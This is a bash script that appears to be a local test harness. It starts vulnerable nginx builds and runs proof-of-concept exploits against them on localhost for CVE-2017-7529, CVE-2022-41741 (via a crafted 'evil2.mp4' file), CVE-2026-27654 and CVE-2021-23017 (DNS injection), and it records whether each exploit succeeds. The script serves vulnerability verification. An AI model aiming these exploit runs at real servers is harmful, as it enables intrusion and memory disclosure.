#!/usr/bin/env bash
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
stop(){ pkill -f "$LAB/nginx-" 2>/dev/null||true; pkill -f backend-7529.py 2>/dev/null||true; sleep 1; }

echo "===7529==="
stop
python3 "$LAB/backend-7529.py" &
sleep 1
"$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529.conf"
curl -s http://127.0.0.1:17529/ >/dev/null
curl -s http://127.0.0.1:17529/ >/dev/null
python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" http://127.0.0.1:17529/
E7529=$?
if [ "$E7529" -ne 0 ]; then
  for o in 1024 2048 4096 768 512; do
    python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" http://127.0.0.1:17529/ "$o" && E7529=0 && break
  done
fi
echo "7529=$E7529"
stop

echo "===41741==="
"$LAB/nginx-1.23.1/sbin/nginx" -V 2>&1 | grep -q http_mp4_module && echo mp4_module=yes || echo mp4_module=no
python3 "$POCLAB/pocs/CVE-2022-41741/poc.py" --oversize 8192 --write "$LAB/www/evil2.mp4"
"$LAB/nginx-1.23.1/sbin/nginx" -c "$LAB/conf/41741.conf"
python3 "$POCLAB/pocs/CVE-2022-41741/poc.py" http://127.0.0.1:41741/evil2.mp4
E41741=$?
echo "41741=$E41741"
tail -5 "$LAB/41741-error.log" 2>/dev/null
stop

echo "===27654==="
mkdir -p "$LAB/datafiles"
unshare -Ur -m bash <<INNER
set -e
mkdir -p /data/files
mount --bind $LAB/datafiles /data/files
$LAB/nginx-1.29.6/sbin/nginx -c $LAB/conf/27654.conf
python3 $POCLAB/pocs/CVE-2026-27654/poc.py http://127.0.0.1:27654
INNER
E27654=$?
echo "27654=$E27654"
tail -8 "$LAB/27654-error.log" 2>/dev/null
stop

echo "===23017==="
if [ "$(id -u)" -eq 0 ]; then
  python3 -c "import scapy" 2>/dev/null || pip3 install -q scapy
  pkill dnsmasq 2>/dev/null||true
  dnsmasq --keep-in-foreground --port=53 --listen-address=127.0.0.53 --no-hosts --no-resolv &
  d=$!
  sleep 1
  cat >"$LAB/conf/23017.conf" <<EOF
worker_processes 1;
error_log $LAB/23017-error.log info;
pid $LAB/23017.pid;
events { worker_connections 64; }
http {
    resolver 127.0.0.53 valid=30s ipv6=off;
    server {
        listen 23017;
        location / {
            set \$u "http://resolve.test/";
            proxy_pass \$u;
        }
    }
}
EOF
  "$LAB/nginx-1.20.0/sbin/nginx" -c "$LAB/conf/23017.conf"
  timeout 20 python3 "$POCLAB/pocs/CVE-2021-23017/poc.py" -t 127.0.0.1 -r 127.0.0.53 &
  p=$!
  sleep 2
  curl -sf --max-time 5 http://127.0.0.1:23017/ >/dev/null || true
  wait $p; E23017=$?
  kill $d 2>/dev/null||true
  tail -5 "$LAB/23017-error.log" 2>/dev/null
else
  E23017=2
  echo "need root for ARP/DNS injection"
fi
echo "23017=$E23017"
stop
echo "FINAL 7529=$E7529 41741=$E41741 27654=$E27654 23017=$E23017"
